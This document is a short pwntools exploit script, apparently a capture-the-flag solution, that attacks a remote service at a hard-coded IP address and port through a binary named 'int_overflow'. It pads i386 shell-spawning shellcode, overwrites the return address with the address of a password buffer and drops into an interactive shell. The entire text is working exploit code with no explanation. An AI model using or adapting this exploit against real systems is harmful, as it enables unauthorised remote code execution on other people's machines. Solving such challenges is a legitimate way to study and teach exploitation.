from pwn import *

#p = process('./bin/int_overflow')
p = remote('52.175.52.175','39005')
context.log_level = 'debug'

elf=ELF('./bin/int_overflow')
passwd_buf_addr = elf.symbols['passwd_buf']
shellcode = shellcraft.i386.sh()
"""
gdb.attach(p,'''
b*check
c
	''')
	"""
p.recvuntil("wd:\n")     
payload = asm(shellcode).ljust(0x3b+4,b'a')+p32(passwd_buf_addr)+b'a'*194  #63+4+194=261
p.sendline(payload)
p.interactive()